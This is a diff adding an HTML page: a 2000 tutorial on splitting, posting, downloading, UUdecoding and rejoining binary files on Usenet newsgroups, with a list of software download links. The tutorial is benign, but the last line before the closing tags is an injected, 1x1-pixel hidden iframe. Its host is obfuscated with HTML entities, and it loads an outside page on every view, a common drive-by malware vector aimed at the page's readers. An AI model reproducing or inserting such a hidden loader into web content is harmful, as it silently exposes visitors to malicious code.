@@ -1,0 +1,231 @@
+<html>
+<head>
+<title>UPLOADING AND DOWNLOADING BINARY FILES TO USENET NEWSGROUPS</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                             <a href="http://www.ElfQrin.com" target="_blank">http://www.ElfQrin.com</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I  <b>UPLOADING AND DOWNLOADING</b>  I                    /
+    \     HTML by:        I    <b>BINARY FILES TO USENET</b>   I   Written by:     /
+    &gt;                     I          <b>NEWSGROUPS</b>         I                  &lt;
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   Elf Qrin        \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>v1.0 r18Mar2000<br>
+First Release: r18Mar2000
+The latest version of this document can be found at <a href="http://www.ElfQrin.com/docs/ngload.html" target="_blank">http://www.ElfQrin.com/docs/ngload.html</a></p>
+<p><b>IMPORTANT:</b> I made this document available on the Web. If you find this document posted in a newsgroup by someone else,
+it doesn't mean in any way I'm connected with that newsgroup.</p>
+<p><b>NOTE:</b> At the end of this article you'll find a list of all the programs I'll talk about, with the URLs to download them.</p>
+<h3>HOW TO UPLOAD</h3>
+<p>The purpose of this article is to explain how to upload and download binary files to a newsgroup, with a particular attention to large files sent in multiple posts.
+Since most newservers limit the size of binary files attached to the messages, you may split a large file into smaller chunks and attack them to several messages. As a
+general rule, if the file you want to send is larger than 1Mb you'll have to split it into smaller files.</p>
+<p>The most popular tool to split large files into chunks in the Windows environment is Mastersplitter, which purpose is "to split large files in order to move them via floppies or
+for transmission via E-mail." It also can Join chunks or Compare them to verify they are the same of the original file.
+All you have to do is to launch Mastersplitter, enter the name of the large file you want to split, enter the size (for example, 700Kb).</p>
+<p>Anyway, splitting files is not so hard, and you can easily write by yourself a file splitter in C or in QBasic.</p>
+<p>It's better not to create too many small chunks because some of them could be lost passing from newsserver to newsserver, and you'll have to repost them, in order to
+satisfy all the audience. A size of about 700Kb should be good, considering that binaries attachment are encoded, and grows of 1/4 of their original size, and the
+addictional bytes required for the header and the rest of the body of the message, so that the total size of the message will be lower than 1Mb.</p>
+<p>Once you have splitted the file, you can post it to the newsgroup. Make sure the newsserver to which you'll send your messages accepts posting (i.e. it's not a read-only
+newsserver), and accepts binary attachments. Here you can find a list of free NNTP servers: <a href="http://www.ElfQrin.com/mine/nntpserv.html" target="_blank">http://www.ElfQrin.com/mine/nntpserv.html</a></p>
+<p>Since attaching every chunk to a message and then send it it's a long and boring duty, you can use an automatic tool such as Autopost.
+With Autopost you can put all the files (single files or chunks of a larger file) you want to post in a directory, for example C:\TEMP, then you can launch the program and
+click on the "Settings" button to enter the option window in which you can enter the NNTP server you want to use (Host), login info (username and password) in case you
+are not useing a free server, the Header information (Name, Reply-To, Organization), and a prefix to the Subject (the Subject of every post will be made by your Prefix,
+followed by the file name and [1/1] that means the message has 1 binary attachment. Sadly autopost doesn't add the size of the attachment which is an useful information,
+especially if who downloads it has a slow connection), the directory containing the files you want to send, and the destination newsgroup.
+When you are finished with the options, you can click on OK, and then you can start posting by pressing the "Post" button.</p>
+<p>If you are doing it for the first time, you can try to post something to alt.test or even better, since they are binary files, to alt.binaries.test : it's not a Good Thing to send
+binary files to non-binary newsgroups, even if the server allows you to do that. Also when you'll make your actual post, make sure that it's "on topic" with the newsgroup
+you choose. You'd better lurk in a newsgroup for at least one/two weeks before to make your first post.</p>
+<p>A last note about netiquette: make sure you are not using ALL CAPITAL LETTERS not only in the body of your message, but also in your name and subject.</p>
+<h3>HOW TO DOWNLOAD</h3>
+<p>To download files from a newsgroup, of course you need to have access to that newsgroup first. So you'll need a program to read newsgroups and a NNTP server that
+carries the newsgroup you want to open.
+If your ISP doesn't have a NNTP server, or it has but it doesn't carry the newsgroup you like, or it only gets a few posts for that newsgroup, you can try one of the free
+NNTP servers from the list at the URL provided above.</p>
+<p>For what concerns the application, a browser like Netscape or IE is good enough. If you want to try a specific news agent, you may try Forte Agent. Forte Agent can also
+automatically split and rejoin large files.
+To open a newsgroup from a browser, you have to enter in the location field (the one in where you normally enter the URL of a webpage) the "news" protocol followed by the
+DNS or the IP address of the NNTP server you intend to use, and the name of the newsgroup you want to open, such as in this example:
+news://news.unina.it/alt.binaries.pictures.animated.gifs</p>
+<p>The content of a newsgroup looks similar to your normal mailbox: you can read the posts by clicking on them. If they have an attachment it usually will appear as a link at
+the bottom of the message. All you have to do is to right click it and save it to disk. If they are chunks of a large file, name them with a progressive number (for example
+"File1", "File2", "File3", or just "1", "2", "3"...), to make things easier when you'll have to rejoin them.
+If the attachment is a picture it will be shown directly, unless it is encoded, or you have disabled this function, in case your news agent allows it (on Netscape 4.5+ you can
+disable image loading with Edit|Preferences...|Advanced| and then uncheck "Automatically load images"). Anyway, in this case you also can right click the picture and
+save it to disk.</p>
+<p>It may happen that the message you opened is not what you expected to, for it has nothing to do with the topic of the newsgroup, because it can be a message posted or
+crossposted to the wrong newsgroup, or more likely spam (commercial message), or a message posted by a "troll" (annoying person who don't believe in free speech
+online and flood newsgroups he doesn't like with fake messages).
+In this case ignore the message and open another one, as a general rule don't even reply to trolls: that's what they want to enhance their otherwise low self-esteem
+(because they are happy to know someone considered them) and increase flood on the newsgroup. Send your complains to his ISP, instead. If the newsgroup is
+moderated, moderators will simply delete posts from spammers and trolls (however moderation is generally not a Good Thing, because it's anyway a form of censorship).
+If you are using a browser, you'd better disable JavaScript inside the messages to prevent spammers to redirect your browser to their website. On Netscape 4.5+ you can
+do that with Edit|Preferences...|Advanced| and then uncheck "Enable JavaScript for Mail and News".</p>
+<p>Binary attachments for their same nature (as they are binary files attached to an otherwise pure text file) are encoded in some way, but generally your news agent can
+decode them automatically, in a transparent way for you, still some encoding can't be decoded "on the fly" (like Base64) and if you are downloading a picture, you'll see a
+link to save instead of the picture, even if you enabled the images.
+Some agents, such as Netscape, don't have a direct support for UUencoded (one of the first encoding systems. UU means "Unix to Unix") attachments, and you'll receive
+it as a file in this format:</p>
+<blockquote>
+<pre>
+
+begin PERMISSION_MODE FILENAME
+UUencoded data
+`
+end
+
+as in the following example:
+
+begin 644 europe.jpg
+M;2XN+BXN+R\N+B\O+BXN+BXN+R\N+B\O+BXO+RXO+RXN+B\ON+B\O+BXN
+M"AM;-#LV2"`@("`@+R`@7`H;6S$[,3%("AM;,CLQ,4@@("`@&lt;("\*&ULS
+`
+end
+</pre>
+</blockquote>
+<p>The encoded data is a series of lines of ASCII text characters which are normally 60 characters long and begin with the letter "M". When UUencoded files are saved as
+stand alone files, generally have an ".uu" or ".uue" extension.</p>
+<p>If you get this kind of attachment, and your agent doesn't offer a support for it, you have to decode it "manually" first. You have to proceed this way:
+Copy the whole body of the message (usually with CTRL+A to select all, followed by CTRL+C to copy it), then paste it (CTRL+V) on a good text editor. Don't use the
+standard Windows Notepad because it can't handle large text files and have problems with some special characters.
+The best Notepad replacement I ever found (and I've tried them all) is JGsoft EditPad which is also almost freeware (actually Postcardware: the author expects that you
+send him a postcard if you decide to keep his software, even if there's no expiry time nor nag screens). Download it, unzip it, rename editplus.exe as notepad.exe, copy it
+in your Windows directory (normally C:\WINDOWS) overwriting the original file, and forget the ugly Windows Notepad as ever existed (note: if you want to keep a copy of
+the original Notepad, copy it elsewhere but don't move or rename it, because Windows will redirect the File Types to the renamed/moved program).
+Another excellent text editor mainly meant for coders is EditPlus (shareware), but it has too many functions to be considered a simple Notepad replacement, so I'd rather
+install it as a second text editor.</p>
+<p>However, once you have it in your text editor, delete all the lines which aren't part of the UUencoded file (everything above the "begin" line and below the "end" line) and
+save it to disk with the name you want. Now you can decode it with Shell Decode Extension or Aladdin Expander. Remember to delete the UUencoded file you saved after
+decoding it, for it will be only a waste of space on your hard disk.</p>
+<p>If the file you are downloading has been UUencoded and then split in multiple chunks, it may happen that single chunks doesn't have the "begin" and the "end" lines. In this
+case, after you have deleted all the useless lines, leaving only the ones that begin with a "M", manually add the begin/end lines, as in the following example:</p>
+<blockquote>
+<pre>
+begin 644 File2
+M;2XN+BXN+R\N+B\O+BXN+BXN+R\N+B\O+BXO+RXO+RXN+B\ON+B\O+BXN
+M"AM;-#LV2"`@("`@+R`@7`H;6S$[,3%("AM;,CLQ,4@@("`@<("\*&ULS
+end</pre>
+</blockquote>
+<p>If you have several chunks of a large files on your hard disk, now it's time to rejoin them. You can do that with a tool such as MasterSplitter, or manually, from the MS-DOS
+command line.
+In this case you can use the COPY command like in the following example:</p>
+<blockquote>
+<p>COPY /B File1+File2+File3+File4+FileN DestFile.ext</p>
+</blockquote>
+<p>Where DestFile.ext is the name of the destination file name with the appropriate extension (.MPG for MPEG movies, .MP3 for MP3 audio files, .JPG or .GIF for pictures,
+and so on...)</p>
+<p>The option /B is necessary because you are joining Binary files. If you try to join binary files without the /B option, they will be treated as ASCII (pure text) files, and the
+copy process will end as soon as the computer will meet a byte with a value of 0, because it will consider it as an End-Of-File (EOF) marker.</p>
+<p>If you have several chuncks and you can't put all of their names in a single MS-DOS command line (there's a limit of 127 characters for a single command line), you'd better
+join them in larger chunks first, as in the following example:</p>
+<blockquote>
+<p>COPY /B File1+File2+File3+File4+File5+File6 File1-6<br>
+COPY /B File7+File8+File9+File10+File11+File12 File7-12<br><br>
+COPY /B File1-6+File7-12 TheMovie.mpg</p>
+</blockquote>
+<p>If there are some missing chunks, you can post a message asking to the original poster or to someone else who got all the posts, to post the missing chunks again. It
+would be nice to have a second newsgroup dedicated only to reposts (a kind of "subnewsgroup"), to don't bother people that got all the parts of the file.
+Before to ask, you can try to open that newsgroup from another NNTP server. Since news posts are passed from a server to another, it may happen that your server didn't
+get all the posts, but you could find them in another one which has a better "feed" (it gets posts from more newsservers) and a longer history (it keeps old posts for a longer
+time).</p>
+<p>However, if you can't get all the chunks but the file you were downloading is an MPEG movie, still you can join the chunks you got, if you have at least the first chunk which
+contains the MPEG header information. You'll notice some weird effects when two non contiguos chunks join.
+Another interesting peculiarity of MPEG files is that you can view them during the downloading. When you open a message containing a MPEG video, stop it as soon as
+the link with its file name appear (on Netscape), then right click on the link and save it to disk, so that the file will be saved directly from the Internet to the disk.
+Now you can make a copy of the file (click on the file name, then press CTRL+C followed by CTRL+V) and launch it while the rest of the file is still to be downloaded.
+This is useful to see if the video you are downloading is actually what you expect, rather than a video you already have with a different name, spam, or something that could
+be inconvenient for you.<br>
+To see at least a frame of the MPEG video, you should wait until you got at least the first 35Kb (actually it depends from the width/height, color depth and resolution of the
+video), while if you want to have a more precise idea of the first second of animation, you should wait until you got 75/100Kb.
+The same peculiarity apply to MP3 audio files and also to JPEG images.</p>
+<p>If the file you have downloaded is an executable file, DELETE IT AT ONCE. Never run executable program files downloaded from a newsgroup. They are VERY likely to be
+trojans or viruses (especially if the program was posted in a newsgroup in which are expressed unpopular ideas). Even if you trust the sender, you can't be sure if instead is
+someone who forged his identity.<br>
+A trojan can format your hard disk, work as a hidden server that keeps a "back door" open to intruders, or send your e-mail address and other personal information to
+someone else on the Internet, if you are online, or next time you are online.
+If for some reason you think you have absolutely to try that file, and you can't download it from somewhere else at least check it with an Antivirus such as McAfee before,
+which however is a good thing to do for any executable file you downloaded from the Internet, or more specifically from a website you've never been before.</p>
+<h3>HOW TO VIEW A FILE DOWNLOADED FROM A NEWSGROUP</h3>
+<p>If the file is compressed, you have to decompress it first.
+There are many compression formats but most common one is ZIP that might be associated with other kind of compressions.
+However the extension of the file will look like .ZIP, .GZIP, or .TAR.ZIP . WinZip can handle them all, and if you installed the WinZip shell extension you can right click on
+the file and choose Extract to... from the context menu.
+For more compression types you can try Aladdin Expander, which also handles typical Mac compressed files such as .HQX or .SIT (StuffIt).</p>
+<p>Now that you have uncompressed the file, you can open it.</p>
+<p>Microsoft Windows MediaPlayer handles almost all the audio/video formats. Be sure to have the latest version installed. Another freeware alternative is TornaPlayer.
+If the file is an MP3 you may want to use a better and most specific player as WinAmp.</p>
+<p>Pictures in almost any format can be opened with ACD-See (shareware) or IrfanView (freeware). For more (and uncommon) graphic formats you can try a professional
+application as Corel Photo-Paint. With PhotoPaint you can also edit pictures to adjust colors, contrast, or sharpness. In this case you should save the file with the same
+name, but adding an "r" as a suffix to the file name: is a good rule to don't never change the name of a picture, especially if it's part of a series.</p>
+
+
+<h3>SOFTWARE PRESENTED IN THIS ARTICLE:</h3>
+<p>The version number is the latest available at the moment
+The URL points to the download page in the official website</p>
+<p>MasterSplitter v2.1 r17Jun1999 (shareware $10) by TomaSoft Corporation<br>
+<a href="http://www.tomasoft.com/" target="_blank">http://www.tomasoft.com/</a></p>
+<p>AutoPost v1.01n Final June/97 (shareware $10) by Eucalypt Software<br>
+<a href="http://www.eucalypt.com/" target="_blank">http://www.eucalypt.com/</a></p>
+<p>Netscape Communicator 4.72 (freeware) by Netscape<br>
+<a href="http://home.netscape.com/download/" target="_blank">http://home.netscape.com/download/</a></p>
+<p>Forte Agent v1.7 (shareware $29) by Forte<br>
+<a href="http://www.forteinc.com/agent/index.htm" target="_blank">http://www.forteinc.com/agent/index.htm</a></p>
+<p>Forte Free Agent v1.21 (freeware, light version of Forte Agent) by Forte<br>
+<a href="http://www.forteinc.com/agent/freagent.htm" target="_blank">http://www.forteinc.com/agent/freagent.htm</a></p>
+<p>Decode Shell Extension v4.3 (freeware) by Funduc Software<br>
+<a href="http://www.funduc.com/otsoft.htm#decodeshellextension" target="_blank">http://www.funduc.com/otsoft.htm#decodeshellextension</a></p>
+<p>Aladdin Expander v5.0 (freeware) by Aladdin Systems<br>
+<a href="http://www.aladdinsys.com/downloads/" target="_blnak">http://www.aladdinsys.com/downloads/</a></p>
+<p>WinZip v7.0 SR-1 or 8 beta (shareware $29) by Nico Mak Computing<br>
+<a href="http://www.winzip.com/download.cgi" target="_blank">http://www.winzip.com/download.cgi</a></p>
+<p>McAfee Virus Scan v4.0.3 (shareware) by McAfee/Associate Networks<br>
+<a href="http://www.mcafee.com/" target="_blank">http://www.mcafee.com/</a></p>
+<p>EditPad v3.5.1 r23Oct1999 (postcardware) by JGsoft<br>
+<a href="http://www.jgsoft.com/editpad.shtml" target="_blank">http://www.jgsoft.com/editpad.shtml</a></p>
+<p>EditPlus Text Editor v2.01a (shareware $30) by ES-Computing<br>
+<a href="http://www.editplus.com/download.html" target="_blank">http://www.editplus.com/download.html</a></p>
+<p>Windows Media Player v6.4 (freeware) by Microsoft<br>
+<a href="http://www.microsoft.com/windows/mediaplayer/en/download/Win32Otherx86.asp" target="_blank">http://www.microsoft.com/windows/mediaplayer/en/download/Win32Otherx86.asp</a></p>
+<p>TornaPlayer v1.1e (freeware) by TornaSoft<br>
+<a href="http://www.tornasoft.com/eng/software/tornaplayer/indexn.html" target="_blank">http://www.tornasoft.com/eng/software/tornaplayer/indexn.html</a></p>
+<p>WinAmp v2.61 (freeware) by NullSoft<br>
+<a href="http://www.winamp.com/winamp/download/index.phtml" target="_blank">http://www.winamp.com/winamp/download/index.phtml</a></p>
+<p>ACD-See v3.0 build 1205 (shareware $45) by ACD Systems<br>
+<a href="http://www.acdsee.com/products/download.htm" target="_blank">http://www.acdsee.com/products/download.htm</a></p>
+<p>IrfanView v3.12 (freeware) by Irfan Skiljan<br>
+<a href="http://stud1.tuwien.ac.at/~e9227474/english.htm" target="_blank">http://stud1.tuwien.ac.at/~e9227474/english.htm</a></p>
+<p>Corel PhotoPaint 9 (commercial) by Corel<br>
+<a href="http://www.corel.com" target="_blank">http://www.corel.com</a></p>
+<p>Acrobat Reader 4.0 (freeware) by Adobe<br>
+<a href="http://www.adobe.com/prodindex/acrobat/readstep.html" target="_blank">http://www.adobe.com/prodindex/acrobat/readstep.html</a></p>
+<p>RealPlayer 7 (shareware $29.99) by RealMedia<br>
+<a href="http://www.real.com/" target="_blank">http://www.real.com/</a></p>
+<p>Also, you can look for most common downloadable programs on ZDnet:<br>
+<a href="http://www.zdnet.com/downloads/" target="_blank">http://www.zdnet.com/downloads/</a></p>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
